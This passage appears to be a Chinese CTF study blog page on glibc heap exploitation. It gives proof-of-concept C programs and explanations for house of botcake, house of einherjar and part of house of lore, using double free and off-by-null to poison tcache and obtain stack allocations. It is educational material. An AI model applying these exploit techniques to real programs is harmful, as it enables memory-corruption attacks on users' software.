class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个<strong>double free</strong></p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们<strong>通过覆写b来将我们a的fwd指针指向栈上</strong></p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>double free</p>
<h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.26</code>—— 至今</li>
<li>多次释放 <code>chunk</code> 的能力</li>
</ul>
<h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p>
<ul>
<li>申请 <code>7</code> 个大小相同，大小大于 <code>0x80</code> 的 <code>chunk</code>，再申请三个，分别为 <code>chunk A</code> 和 <code>chunkB</code> 和 <code>chunk C</code></li>
<li>释放前 <code>7</code> 个和 <code>chunk A</code>，前面 <code>7</code> 个都会进入到 <code>tcachebin</code> 里面，<code>chunk A</code> 进入到 <code>unsortedbin</code></li>
<li>释放 <code>chunk B</code>，则 <code>chunk B</code> 会和 <code>chunk A</code> 合并</li>
<li>从 <code>tcachebin</code> 分配走一个</li>
<li>再次释放 <code>chunk B</code>，此时 <code>B</code> 同时存在与 <code>unsortedbin</code> 和 <code>tcachebin</code></li>
</ul>
<h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>在高版本需要绕过指针保护的检查</li>
</ul>
<h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造出堆重叠，为后续利用做准备</li>
</ul>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>效果：任意地址分配</p>
<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/#_1">ctf-wiki</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar, made by Huascar Tejeda - @htejeda, works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="type">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="type">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *b = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *c = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">    <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="type">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p>
<h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li>
<li>释放 <code>A</code>，进入 <code>unsortedbin</code></li>
<li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li>
<li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li>
<li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li>
</ul>
<h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p>
<p>最开始的 <code>unlink</code> 的代码是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">		<span class="comment">// .....							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;									      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p>
<p>高版本的 <code>unlink</code> 的条件是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p>
<h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li>
<li>结合其他方法进行任意地址读写</li>
</ul>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = 